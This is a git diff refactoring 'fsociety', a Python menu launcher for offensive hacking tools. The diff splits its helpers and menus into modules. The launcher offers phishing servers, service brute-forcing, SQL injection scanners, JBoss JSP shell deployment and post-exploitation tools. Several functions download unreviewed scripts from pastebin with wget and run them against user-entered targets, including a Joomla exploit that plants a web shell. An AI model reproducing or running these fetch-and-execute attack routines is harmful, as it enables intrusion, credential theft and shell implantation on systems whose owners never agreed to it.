@@ -15,9 +15,8 @@
 #                             Tool For Hacking
 #                             Author : Manisso
 
-"""
-Imports
-"""
+from core import common, informationGathering, passwordAttacks
+
 import argparse
 import base64
 import glob
@@ -56,105 +55,15 @@ except:
     import urllib.parse as urlparse
     import subprocess as commands
 
-"""
-Common Functions
-"""
-
-
-class Color:
-    HEADER = '\033[95m'
-    IMPORTANT = '\33[35m'
-    NOTICE = '\033[33m'
-    BLUE = '\033[94m'
-    GREEN = '\033[92m'
-    WARNING = '\033[93m'
-    RED = '\033[91m'
-    END = '\033[0m'
-    UNDERLINE = '\033[4m'
-    LOGGING = '\33[34m'
-
-
-def clear_scr():
-    os.system('clear')
-
-
-def yes_or_no():
-    return secure_input("Continue Y / N: ") in yes
-
-"""
-Config
-"""
-installDir = os.path.dirname(os.path.abspath(__file__)) + '/'
-configFile = os.path.join(installDir, "/fsociety.cfg")
-print(installDir)
-config = ConfigParser.RawConfigParser()
-config.read(configFile)
-
-toolDir = installDir + config.get('fsociety', 'toolDir')
-logDir = installDir + config.get('fsociety', 'logDir')
-yes = config.get('fsociety', 'yes').split()
-color_random = [Color.HEADER, Color.IMPORTANT, Color.NOTICE, Color.BLUE, Color.GREEN, Color.WARNING, Color.RED,
-                Color.END, Color.UNDERLINE, Color.LOGGING]
-random.shuffle(color_random)
-fsocietylogo = color_random[0] + '''
-        d88888b .d8888.  .d88b.   .o88b. d888888b d88888b d888888b db    db
-        88'     88'  YP .8P  Y8. d8P  Y8   `88'   88         88    `8b  d8'
-        88ooo   `8bo.   88    88 8P         88    88ooooo    88     `8bd8'
-        88        `Y8b. 88    88 8b         88    88         88       88
-        88      db   8D `8b  d8' Y8b  d8   .88.   88.        88       88
-        YP      `8888Y'  `Y88P'   `Y88P' Y888888P Y88888P    YP       YP
-        '''
-fsociety_prompt = "fsociety ~# "
-alreadyInstalled = "Already Installed"
-continuePrompt = "\nClick [Return] to continue"
-
-termsAndConditions = Color.NOTICE + '''
-I shall not use fsociety to:
-(i) upload or otherwise transmit, display or distribute any
-content that infringes any trademark, trade secret, copyright
-or other proprietary or intellectual property rights of any
-person; (ii) upload or otherwise transmit any material that contains
-software viruses or any other computer code, files or programs
-designed to interrupt, destroy or limit the functionality of any
-computer software or hardware or telecommunications equipment;
-''' + Color.END
-
-"""
-Starts Menu Classes
-"""
-
-
-def secure_input(message):
-    try:
-        # Python2
-        user_input = raw_input(message)
-    except:
-        # Python3
-        user_input = input(message)
-
-    return user_input
-
-
-def agreement():
-    while not config.getboolean("fsociety", "agreement"):
-        clear_scr()
-        print(termsAndConditions)
-        agree = secure_input("You must agree to our terms and conditions first (Y/n) ")
-        if agree.lower() in yes:
-            config.set('fsociety', 'agreement', 'true')
-            return True
-        else:
-            return False
-
 
 class Fsociety:
     def __init__(self):
-        clear_scr()
+        common.clear_scr()
         self.create_folders()
-        print(fsocietylogo + Color.RED + '''
+        print(common.fsocietylogo + common.Color.RED + '''
        }--------------{+} Coded By Manisso {+}--------------{
        }--------{+}  GitHub.com/Manisso/fsociety {+}--------{
-    ''' + Color.END + '''
+    ''' + common.Color.END + '''
        {1}--Information Gathering
        {2}--Password Attacks
        {3}--Wireless Testing
@@ -167,12 +76,12 @@ class Fsociety:
        {11}-CONTRIBUTORS
        {99}-EXIT\n
     ''')
-        choice = secure_input(fsociety_prompt)
-        clear_scr()
+        choice = common.secure_input(common.fsociety_prompt)
+        common.clear_scr()
         if choice == "1":
-            InformationGatheringMenu()
+            informationGathering.InformationGatheringMenu()
         elif choice == "2":
-            passwordAttacksMenu()
+            passwordAttacks.passwordAttacksMenu()
         elif choice == "3":
             wirelessTestingMenu()
         elif choice == "4":
@@ -188,10 +97,10 @@ class Fsociety:
         elif choice == "0":
             self.update()
         elif choice == "11":
-            self.github_contributors()
+            Fsociety.github_contributors()
         elif choice == "99":
-            with open(configFile, 'wb') as configfile:
-                config.write(configfile)
+            with open(common.configFile, 'wb') as configfile:
+                common.config.write(configfile)
             sys.exit()
         elif choice == "\r" or choice == "\n" or choice == "" or choice == " ":
             self.__init__()
@@ -203,8 +112,8 @@ class Fsociety:
         self.completed()
 
     @staticmethod
-    def github_contributors(self):
-        clear_scr()
+    def github_contributors():
+        common.clear_scr()
         print('''
      dP""b8  dP"Yb  88b 88 888888 88""Yb 88 88""Yb .dP"Y8
     dP   `" dP   Yb 88Yb88   88   88__dP 88 88__dP `Ybo."
@@ -219,13 +128,13 @@ class Fsociety:
 
     @staticmethod
     def create_folders():
-        if not os.path.isdir(toolDir):
-            os.makedirs(toolDir)
-        if not os.path.isdir(logDir):
-            os.makedirs(logDir)
+        if not os.path.isdir(common.toolDir):
+            os.makedirs(common.toolDir)
+        if not os.path.isdir(common.logDir):
+            os.makedirs(common.logDir)
 
     def completed(self):
-        secure_input("Completed, click return to go back")
+        common.secure_input("Completed, click return to go back")
         self.__init__()
 
     @staticmethod
@@ -244,7 +153,7 @@ class SniffingSpoofingMenu:
     '''
 
     def __init__(self):
-        clear_scr()
+        common.clear_scr()
         print(self.menuLogo)
         print(
             "   {1}--SEToolkit - Tool aimed at penetration testing around Social-Engineering")
@@ -253,8 +162,8 @@ class SniffingSpoofingMenu:
             "   {3}--pyPISHER - Tool to create a mallicious website for password pishing")
         print("   {4}--SMTP Mailer - Tool to send SMTP mail\n ")
         print("   {99}-Back To Main Menu \n")
-        choice6 = secure_input(fsociety_prompt)
-        clear_scr()
+        choice6 = common.secure_input (common.fsociety_prompt)
+        common.clear_scr()
         if choice6 == "1":
             setoolkit()
         elif choice6 == "2":
@@ -270,7 +179,7 @@ class SniffingSpoofingMenu:
         self.completed()
 
     def completed(self):
-        secure_input("Completed, click return to go back")
+        common.secure_input("Completed, click return to go back")
         self.__init__()
 
 
@@ -283,7 +192,7 @@ class WebHackingMenu:
     '''
 
     def __init__(self):
-        clear_scr()
+        common.clear_scr()
         print(self.menuLogo)
         print("   {1}--Drupal Hacking ")
         print("   {2}--Inurlbr")
@@ -299,8 +208,8 @@ class WebHackingMenu:
             "   {11}-BruteX - Automatically brute force all services running on a target")
         print("   {12}-Arachni - Web Application Security Scanner Framework \n ")
         print("   {99}-Back To Main Menu \n")
-        choiceweb = secure_input(fsociety_prompt)
-        clear_scr()
+        choiceweb = common.secure_input (common.fsociety_prompt)
+        common.clear_scr()
         if choiceweb == "1":
             maine()
         elif choiceweb == "2":
@@ -332,7 +241,7 @@ class WebHackingMenu:
         self.completed()
 
     def completed(self):
-        secure_input("Completed, click return to go back")
+        common.secure_input("Completed, click return to go back")
         self.__init__()
 
 
@@ -345,14 +254,14 @@ class PrivateWebHacking:
     '''
 
     def __init__(self):
-        clear_scr()
+        common.clear_scr()
         print(self.menuLogo)
-        target = secure_input("Enter Target IP: ")
+        target = common.secure_input("Enter Target IP: ")
         Fscan(target)
         self.completed()
 
     def completed(self):
-        secure_input("Completed, click return to go back")
+        common.secure_input("Completed, click return to go back")
         self.__init__()
 
 
@@ -365,14 +274,14 @@ class PostExploitationMenu:
     '''
 
     def __init__(self):
-        clear_scr()
+        common.clear_scr()
         print(self.menuLogo)
         print("   {1}--Shell Checker")
         print("   {2}--POET")
         print("   {3}--Phishing Framework \n")
         print("   {99}-Return to main menu \n ")
-        choice11 = secure_input(fsociety_prompt)
-        clear_scr()
+        choice11 = common.secure_input (common.fsociety_prompt)
+        common.clear_scr()
         if choice11 == "1":
             sitechecker()
         elif choice11 == "2":
@@ -386,442 +295,8 @@ class PostExploitationMenu:
         self.completed()
 
     def completed(self):
-        secure_input("Completed, click return to go back")
+        common.secure_input("Completed, click return to go back")
         self.__init__()
-
-
-"""
-Information Gathering Tools Classes
-"""
-
-
-class InformationGatheringMenu:
-    menuLogo = '''
-    88 88b 88 888888  dP"Yb
-    88 88Yb88 88__   dP   Yb
-    88 88 Y88 88""   Yb   dP
-    88 88  Y8 88      YbodP
-    '''
-
-    def __init__(self):
-        clear_scr()
-        print(self.menuLogo)
-
-        print("  {1}--Nmap - Network Mapper")
-        print("  {2}--Setoolkit")
-        print("  {3}--Host To IP")
-        print("  {4}--WPScan")
-        print("  {5}--CMSmap")
-        print("  {6}--XSStrike")
-        print("  {7}--Doork")
-        print("  {8}--Crips\n  ")
-        print("  {99}-Back To Main Menu \n")
-        choice2 = secure_input(fsociety_prompt)
-        clear_scr()
-        if choice2 == "1":
-            nmap()
-        elif choice2 == "2":
-            setoolkit()
-        elif choice2 == "3":
-            host2ip()
-        elif choice2 == "4":
-            wpscan()
-        elif choice2 == "5":
-            CMSmap()
-        elif choice2 == "6":
-            XSStrike()
-        elif choice2 == "7":
-            doork()
-        elif choice2 == "8":
-            crips()
-        elif choice2 == "99":
-            Fsociety()
-        else:
-            self.__init__()
-        self.completed()
-
-    def completed(self):
-        secure_input("Completed, click return to go back")
-        self.__init__()
-
-
-class nmap:
-    nmapLogo = '''
-    88b 88 8b    d8    db    88""Yb
-    88Yb88 88b  d88   dPYb   88__dP
-    88 Y88 88YbdP88  dP__Yb  88"""
-    88  Y8 88 YY 88 dP""""Yb 88
-    '''
-
-    def __init__(self):
-        self.installDir = toolDir + "nmap"
-        self.gitRepo = "https://github.com/nmap/nmap.git"
-
-        self.targetPrompt = "   Enter Target IP/Subnet/Range/Host: "
-
-        if not self.installed():
-            self.install()
-            self.run()
-        else:
-            self.run()
-
-    @staticmethod
-    def installed():
-        return os.path.isfile("/usr/bin/nmap") or os.path.isfile("/usr/local/bin/nmap")
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        os.system("cd %s && ./configure && make && make install" %
-                  self.installDir)
-
-    def run(self):
-        clear_scr()
-        print(self.nmapLogo)
-        target = secure_input(self.targetPrompt)
-        self.menu(target)
-
-    def menu(self, target):
-        clear_scr()
-        print(self.nmapLogo)
-        print("   map scan for: %s\n" % target)
-        print("   {1}--Simple Scan [-sV]")
-        print("   {2}--Port Scan [-Pn]")
-        print("   {3}--Operating System Detection [-A]\n")
-        print("   {99}-Return to information gathering menu \n")
-        response = secure_input("nmap ~# ")
-        clear_scr()
-        logPath = "logs/nmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
-        try:
-            if response == "1":
-                os.system("nmap -sV -oN %s %s" % (logPath, target))
-                response = secure_input(continuePrompt)
-            elif response == "2":
-                os.system("nmap -Pn -oN %s %s" % (logPath, target))
-                response = secure_input(continuePrompt)
-            elif response == "3":
-                os.system("nmap -A -oN %s %s" % (logPath, target))
-                response = secure_input(continuePrompt)
-            elif response == "99":
-                pass
-            else:
-                self.menu(target)
-        except KeyboardInterrupt:
-            self.menu(target)
-
-
-class setoolkit:
-    def __init__(self):
-        self.installDir = toolDir + "setoolkit"
-        self.gitRepo = "https://github.com/trustedsec/social-engineer-toolkit.git"
-
-        if not self.installed():
-            self.install()
-            self.run()
-        else:
-            print(alreadyInstalled)
-            self.run()
-        response = secure_input(continuePrompt)
-
-    @staticmethod
-    def installed():
-        return os.path.isfile("/usr/bin/setoolkit")
-
-    def install(self):
-        os.system("apt-get --force-yes -y install git apache2 python-requests libapache2-mod-php \
-            python-pymssql build-essential python-pexpect python-pefile python-crypto python-openssl")
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        os.system("cd %s && python setup.py install" % self.installDir)
-
-    @staticmethod
-    def run():
-        os.system("setoolkit")
-
-
-class host2ip:
-    host2ipLogo = '''
-    88  88  dP"Yb  .dP"Y8 888888 oP"Yb. 88 88""Yb
-    88  88 dP   Yb `Ybo."   88   "' dP' 88 88__dP
-    888888 Yb   dP o.`Y8b   88     dP'  88 88"""
-    88  88  YbodP  8bodP'   88   .d8888 88 88
-    '''
-
-    def __init__(self):
-        clear_scr()
-        print(self.host2ipLogo)
-        host = secure_input("   Enter a Host: ")
-        ip = socket.gethostbyname(host)
-        print("   %s has the IP of %s" % (host, ip))
-        response = secure_input(continuePrompt)
-
-
-class wpscan:
-    wpscanLogo = '''
-    Yb        dP 88""Yb .dP"Y8  dP""b8    db    88b 88
-     Yb  db  dP  88__dP `Ybo." dP   `"   dPYb   88Yb88
-      YbdPYbdP   88"""  o.`Y8b Yb       dP__Yb  88 Y88
-       YP  YP    88     8bodP'  YboodP dP""""Yb 88  Y8
-    '''
-
-    def __init__(self):
-        self.installDir = toolDir + "wpscan"
-        self.gitRepo = "https://github.com/wpscanteam/wpscan.git"
-
-        if not self.installed():
-            self.install()
-        clear_scr()
-        print(self.wpscanLogo)
-        target = secure_input("   Enter a Target: ")
-        self.menu(target)
-
-    def installed(self):
-        return os.path.isdir(self.installDir)
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-
-    def menu(self, target):
-        clear_scr()
-        print(self.wpscanLogo)
-        print("   WPScan for: %s\n" % target)
-        print("   {1}--Username Enumeration [--enumerate u]")
-        print("   {2}--Plugin Enumeration [--enumerate p]")
-        print("   {3}--All Enumeration Tools [--enumerate]\n")
-        print("   {99}-Return to information gathering menu \n")
-        response = secure_input("wpscan ~# ")
-        clear_scr()
-        logPath = "../../logs/wpscan-" + \
-                  strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
-        wpscanOptions = "--no-banner --random-agent --url %s" % target
-        try:
-            if response == "1":
-                os.system(
-                    "ruby tools/wpscan/wpscan.rb %s --enumerate u --log %s" % (wpscanOptions, logPath))
-                response = secure_input(continuePrompt)
-            elif response == "2":
-                os.system(
-                    "ruby tools/wpscan/wpscan.rb %s --enumerate p --log %s" % (wpscanOptions, logPath))
-                response = secure_input(continuePrompt)
-            elif response == "3":
-                os.system(
-                    "ruby tools/wpscan/wpscan.rb %s --enumerate --log %s" % (wpscanOptions, logPath))
-                response = secure_input(continuePrompt)
-            elif response == "99":
-                pass
-            else:
-                self.menu(target)
-        except KeyboardInterrupt:
-            self.menu(target)
-
-
-class CMSmap:
-    CMSmapLogo = '''
-     dP""b8 8b    d8 .dP"Y8 8b    d8    db    88""Yb
-    dP   `" 88b  d88 `Ybo." 88b  d88   dPYb   88__dP
-    Yb      88YbdP88 o.`Y8b 88YbdP88  dP__Yb  88"""
-     YboodP 88 YY 88 8bodP' 88 YY 88 dP""""Yb 88
-    '''
-
-    def __init__(self):
-        self.installDir = toolDir + "CMSmap"
-        self.gitRepo = "https://github.com/Dionach/CMSmap.git"
-
-        if not self.installed():
-            self.install()
-        clear_scr()
-        print(self.CMSmapLogo)
-        target = secure_input("   Enter a Target: ")
-        self.run(target)
-        response = secure_input(continuePrompt)
-
-    def installed(self):
-        return os.path.isdir(self.installDir)
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-
-    def run(self, target):
-        logPath = "logs/cmsmap-" + \
-                  strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
-        try:
-            os.system("python %s/cmsmap.py -t %s -o %s" %
-                      (self.installDir, target, logPath))
-        except:
-            pass
-
-
-class XSStrike:
-    XSStrikeLogo = '''
-    Yb  dP .dP"Y8 .dP"Y8 888888 88""Yb 88 88  dP 888888
-     YbdP  `Ybo." `Ybo."   88   88__dP 88 88odP  88__
-     dPYb  o.`Y8b o.`Y8b   88   88"Yb  88 88"Yb  88""
-    dP  Yb 8bodP' 8bodP'   88   88  Yb 88 88  Yb 888888
-    '''
-
-    def __init__(self):
-        self.installDir = toolDir + "XSStrike"
-        self.gitRepo = "https://github.com/UltimateHackers/XSStrike.git"
-
-        if not self.installed():
-            self.install()
-        clear_scr()
-        print(self.XSStrikeLogo)
-        self.run()
-        response = secure_input(continuePrompt)
-
-    def installed(self):
-        return os.path.isdir(self.installDir)
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        os.system("pip install -r %s/requirements.txt" % self.installDir)
-
-    def run(self):
-        os.system("python %s/xsstrike" % self.installDir)
-
-
-class doork:
-    doorkLogo = '''
-    8888b.   dP"Yb   dP"Yb  88""Yb 88  dP
-     8I  Yb dP   Yb dP   Yb 88__dP 88odP
-     8I  dY Yb   dP Yb   dP 88"Yb  88"Yb
-    8888Y"   YbodP   YbodP  88  Yb 88  Yb
-    '''
-
-    def __init__(self):
-        self.installDir = toolDir + "doork"
-        self.gitRepo = "https://github.com/AeonDave/doork.git"
-
-        if not self.installed():
-            self.install()
-        clear_scr()
-        print(self.doorkLogo)
-        target = secure_input("   Enter a Target: ")
-        self.run(target)
-        response = secure_input(continuePrompt)
-
-    def installed(self):
-        return os.path.isdir(self.installDir)
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        os.system("pip install beautifulsoup4 requests Django==1.11")
-
-    def run(self, target):
-        if not "http://" in target:
-            target = "http://" + target
-        logPath = "logs/doork-" + \
-                  strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
-        try:
-            os.system("python %s/doork.py -t %s -o %s" %
-                      (self.installDir, target, logPath))
-        except KeyboardInterrupt:
-            pass
-
-
-class crips:
-    cripsLogo = '''
-     dP""b8 88""Yb 88 88""Yb .dP"Y8
-    dP   `" 88__dP 88 88__dP `Ybo."
-    Yb      88"Yb  88 88"""  o.`Y8b
-     YboodP 88  Yb 88 88     8bodP'
-    '''
-
-    def __init(self):
-        self.installDir = toolDir + "Crips"
-        self.gitRepo = "https://github.com/Manisso/Crips.git"
-
-        if not self.installed():
-            self.install()
-        clear_scr()
-        print(self.cripsLogo)
-        self.run()
-
-    def installed(self):
-        return os.path.isdir(self.installDir) or os.path.isdir("/usr/share/doc/Crips")
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        os.system("bash %s/install.sh" % self.installDir)
-
-    def run(self):
-        try:
-            os.system("crips")
-        except:
-            pass
-
-
-"""
-Password Attack Tools Classes
-"""
-
-
-class passwordAttacksMenu:
-    menuLogo = '''
-    88""Yb    db    .dP"Y8 .dP"Y8 Yb        dP 8888b.
-    88__dP   dPYb   `Ybo." `Ybo."  Yb  db  dP   8I  Yb
-    88"""   dP__Yb  o.`Y8b o.`Y8b   YbdPYbdP    8I  dY
-    88     dP""""Yb 8bodP' 8bodP'    YP  YP    8888Y"
-    '''
-
-    def __init__(self):
-        clear_scr()
-        print(self.menuLogo)
-        print("   {1}--Cupp - Common User Passwords Profiler")
-        print(
-            "   {2}--BruteX - Automatically bruteforces all services running on a target\n")
-        print("   {99}-Back To Main Menu \n")
-        choice3 = secure_input("passwd ~# ")
-
-        clear_scr()
-        if choice3 == "1":
-            cupp()
-        elif choice3 == "2":
-            brutex()
-        elif choice3 == "99":
-            Fsociety()
-        else:
-            self.__init__()
-        self.completed()
-
-    def completed(self):
-        secure_input("Completed, click return to go back")
-        self.__init__()
-
-
-class cupp:
-    cuppLogo = '''
-     dP""b8 88   88 88""Yb 88""Yb
-    dP   `" 88   88 88__dP 88__dP
-    Yb      Y8   8P 88"""  88"""
-     YboodP `YbodP' 88     88
-     '''
-
-    def __init__(self):
-        self.installDir = toolDir + "cupp"
-        self.gitRepo = "https://github.com/Mebus/cupp.git"
-
-        if not self.installed():
-            self.install()
-        clear_scr()
-        print(self.cuppLogo)
-        self.run()
-
-    def installed(self):
-        return os.path.isdir(self.installDir)
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-
-    def run(self):
-        os.system("python %s/cupp.py -i" % self.installDir)
 
 
 """
@@ -838,14 +313,14 @@ class wirelessTestingMenu:
     '''
 
     def __init__(self):
-        clear_scr()
+        common.clear_scr()
         print(self.menuLogo)
         print("   {1}--reaver ")
         print("   {2}--pixiewps")
         print("   {3}--Bluetooth Honeypot GUI Framework \n")
         print("   {99}-Back To The Main Menu \n")
-        choice4 = secure_input(fsociety_prompt)
-        clear_scr()
+        choice4 = common.secure_input (common.fsociety_prompt)
+        common.clear_scr()
         if choice4 == "1":
             reaver()
         elif choice4 == "2":
@@ -859,18 +334,18 @@ class wirelessTestingMenu:
         self.completed()
 
     def completed(self):
-        secure_input("Completed, click return to go back")
+        common.secure_input("Completed, click return to go back")
         self.__init__()
 
 
 class reaver:
     def __init__(self):
-        self.installDir = toolDir + "reaver"
+        self.installDir = common.toolDir + "reaver"
         self.gitRepo = "https://github.com/t6x/reaver-wps-fork-t6x.git"
 
         if not self.installed():
             self.install()
-        clear_scr()
+        common.clear_scr()
         self.run()
 
     def installed(self):
@@ -893,12 +368,12 @@ class reaver:
 
 class pixiewps:
     def __init__(self):
-        self.installDir = toolDir + "pixiewps"
+        self.installDir = common.toolDir + "pixiewps"
         self.gitRepo = "https://github.com/wiire/pixiewps.git"
 
         if not self.installed():
             self.install()
-        clear_scr()
+        common.clear_scr()
         self.run()
 
     def installed(self):
@@ -918,11 +393,11 @@ class pixiewps:
 
 class bluepot:
     def __init__(self):
-        self.installDir = toolDir + "bluepot"
+        self.installDir = common.toolDir + "bluepot"
 
         if not self.installed():
             self.install()
-        clear_scr()
+        common.clear_scr()
         self.run()
 
     def installed(self):
@@ -952,7 +427,7 @@ class exploitationToolsMenu:
     '''
 
     def __init__(self):
-        clear_scr()
+        common.clear_scr()
         print(self.menuLogo)
         print("   {1}--ATSCAN")
         print("   {2}--sqlmap")
@@ -964,8 +439,8 @@ class exploitationToolsMenu:
         print("   {8}--Bruteforce the Android Passcode given the hash and salt")
         print("   {9}--Joomla SQL injection Scanner \n ")
         print("   {99}-Go Back To Main Menu \n")
-        choice5 = secure_input(fsociety_prompt)
-        clear_scr()
+        choice5 = common.secure_input (common.fsociety_prompt)
+        common.clear_scr()
         if choice5 == "1":
             atscan()
         elif choice5 == "2":
@@ -991,44 +466,18 @@ class exploitationToolsMenu:
         self.completed()
 
     def completed(self):
-        secure_input("Completed, click return to go back")
+        common.secure_input("Completed, click return to go back")
         self.__init__()
-
-
-class brutex:
-    def __init__(self):
-        self.installDir = toolDir + "brutex"
-        self.gitRepo = "https://github.com/1N3/BruteX.git"
-
-        if not self.installed():
-            self.install()
-        clear_scr()
-        self.run()
-
-    def installed(self):
-        return os.path.isdir(self.installDir)
-
-    def install(self):
-        os.system("git clone --depth=1 %s %s" %
-                  (self.gitRepo, self.installDir))
-        if not os.path.isdir("/usr/share/brutex"):
-            os.makedirs("/usr/share/brutex")
-        os.system("cd %s && chmod +x install.sh && ./install.sh" % self.installDir)
-
-    @staticmethod
-    def run():
-        target = secure_input("Enter Target IP: ")
-        os.system("brutex %s" % target)
 
 
 class arachni:
     def __init__(self):
-        self.installDir = toolDir + "arachni"
+        self.installDir = common.toolDir + "arachni"
         self.gitRepo = "https://github.com/Arachni/arachni.git"
 
         if not self.installed():
             self.install()
-        clear_scr()
+        common.clear_scr()
         self.run()
 
     def installed(self):
@@ -1043,9 +492,9 @@ class arachni:
 
     @staticmethod
     def run():
-        target = secure_input("Enter Target Hostname: ")
+        target = common.secure_input("Enter Target Hostname: ")
         os.system("arachni %s --output-debug 2> %sarachni/%s.log" %
-                  (target, logDir, strftime("%Y-%m-%d_%H:%M:%S", gmtime())))
+                  (target, common.logDir, strftime("%Y-%m-%d_%H:%M:%S", gmtime())))
 
 
 # Updated to Here
@@ -1054,7 +503,7 @@ class arachni:
 def weeman():
     print(
         "HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
-    if yes_or_no():
+    if common.yes_or_no():
         os.system(
             "git clone --depth=1 https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
     else:
@@ -1064,15 +513,15 @@ def weeman():
 def gabriel():
     print("Abusing authentication bypass of Open&Compact (Gabriel's)")
     os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
-    clear_scr()
+    common.clear_scr()
     os.system("python gabriel.py")
-    ftpbypass = secure_input("Enter Target IP and Use Command:")
+    ftpbypass = common.secure_input("Enter Target IP and Use Command:")
     os.system("python gabriel.py %s" % ftpbypass)
 
 
 def sitechecker():
     os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
-    clear_scr()
+    common.clear_scr()
     os.system("python ch01.py")
 
 
@@ -1080,17 +529,17 @@ def ifinurl():
     print(
         ''' This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.''')
     print('Do You Want To Install InurlBR ? ')
-    cinurl = secure_input("Y/N: ")
-    if cinurl in yes:
+    cinurl = common.secure_input("Y/N: ")
+    if cinurl in common.yes:
         inurl()
     else:
         Fsociety()
 
 
 def bsqlbf():
-    clear_scr()
+    common.clear_scr()
     print("This tool will only work on blind sql injection")
-    cbsq = secure_input("select target: ")
+    cbsq = common.secure_input("select target: ")
     os.system(
         "wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
     os.system("perl bsqlbf.pl -url %s" % cbsq)
@@ -1099,7 +548,7 @@ def bsqlbf():
 
 def atscan():
     print("Do You To Install ATSCAN ?")
-    if yes_or_no():
+    if common.yes_or_no():
         os.system("rm -rf ATSCAN")
         os.system(
             "git clone --depth=1 https://github.com/AlisamTechnology/ATSCAN.git && cd ATSCAN && perl atscan.pl")
@@ -1110,7 +559,7 @@ def atscan():
 def commix():
     print("Automated All-in-One OS Command Injection and Exploitation Tool.")
     print("usage: python commix.py --help")
-    if yes_or_no():
+    if common.yes_or_no():
         os.system(
             "git clone --depth=1 https://github.com/stasinopoulos/commix.git commix")
         os.system("cd commix")
@@ -1127,21 +576,21 @@ def vbulletinrce():
 
 def joomlarce():
     os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
-    clear_scr()
+    common.clear_scr()
     print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
-    jmtarget = secure_input("Select a targets list:")
+    jmtarget = common.secure_input("Select a targets list:")
     os.system("python temp.py %s" % jmtarget)
 
 
 def inurl():
-    dork = secure_input("Select a Dork:")
-    output = secure_input("Select a file to save:")
+    dork = common.secure_input("Select a Dork:")
+    output = common.secure_input("Select a file to save:")
     # With the following command we will look for php sites that use the id parameter (dork 'inurl:php?id=') and inject
     # in each GET request a small payload (?´'%270x27;) to check if it is vulnerable to sql injection
     # ./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
     to_exploit = None
     while True:
-        to_exploit = secure_input("What do you want to exploit (GET/POST/ALL/(N)None")
+        to_exploit = common.secure_input("What do you want to exploit (GET/POST/ALL/(N)None")
         if to_exploit.lower() in ["get", "post", "all", "e"]:
             break
     if to_exploit == 'get':
@@ -1163,12 +612,12 @@ def insinurl():
     os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
     os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
     os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
-    clear_scr()
+    common.clear_scr()
     inurl()
 
 
 def jboss():
-    clear_scr()
+    common.clear_scr()
     print('''
     This JBoss script deploys a JSP shell on the target JBoss AS server. Once
     deployed, the script uses its upload and command execution capability to
@@ -1177,7 +626,7 @@ def jboss():
     usage: ./e.sh target_ip tcp_port 
     Continue: y/n
     ''')
-    if yes_or_no():
+    if common.yes_or_no():
         os.system(
             "git clone --depth=1 https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
     else:
@@ -1187,8 +636,8 @@ def jboss():
 def wppluginscan():
     # Problem here. sites_files and filepath must be on file
     notfound = [404, 401, 400, 403, 406, 301]
-    sites_file = secure_input("Sites file: ")
-    filepath = secure_input("Plugins File: ")
+    sites_file = common.secure_input("Sites file: ")
+    filepath = common.secure_input("Plugins File: ")
 
     def scan(site, plugin):
         try:
@@ -1220,7 +669,7 @@ def wppluginscan():
 
 def sqlmap():
     print("usage: python sqlmap.py -h")
-    if yes_or_no():
+    if common.yes_or_no():
         os.system(
             "git clone --depth=1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
     else:
@@ -1257,7 +706,7 @@ def grabshell(url):
 
 def shelltarget():
     print("Example: http://target.com")
-    line = secure_input("Target: ")
+    line = common.secure_input("Target: ")
     line = line.rstrip()
     grabuploadedlink(line)
     grabshell(line)
@@ -1265,7 +714,7 @@ def shelltarget():
 
 def poet():
     print("POET is a simple POst-Exploitation Tool.\n")
-    if yes_or_no():
+    if common.yes_or_no():
         os.system("git clone --depth=1 https://github.com/mossberg/poet.git")
         os.system("python poet/server.py")
     else:
@@ -1276,17 +725,12 @@ def ssls():
     print('''sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping
     attacks.
     It requires Python 2.5 or newer, along with the 'twisted' python module.''')
-    if yes_or_no():
+    if common.yes_or_no():
         os.system("git clone --depth=1 https://github.com/moxie0/sslstrip.git")
         os.system("apt-get install python-twisted-web")
         os.system("python sslstrip/setup.py")
     else:
         SniffingSpoofingMenu()
-
-
-def unique(seq):
-    seen = set()
-    return [seen.add(x) or x for x in seq if x not in seen]
 
 
 def bing_all_grabber(s):
@@ -1331,7 +775,7 @@ def check_gravityforms(sites):
 
 
 def gravity():
-    ip = secure_input('Enter IP: ')
+    ip = common.secure_input('Enter IP: ')
     sites = bing_all_grabber(str(ip))
     gravityforms = check_gravityforms(sites)
     for ss in gravityforms:
@@ -1344,7 +788,7 @@ def gravity():
 def shellnoob():
     print(
         '''Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!''')
-    if yes_or_no():
+    if common.yes_or_no():
         os.system("git clone --depth=1 https://github.com/reyammer/shellnoob.git")
         os.system("mv shellnoob/shellnoob.py shellnoob.py")
         os.system("python shellnoob.py --install")
@@ -1353,8 +797,8 @@ def shellnoob():
 
 
 def androidhash():
-    key = secure_input("Enter the android hash: ")
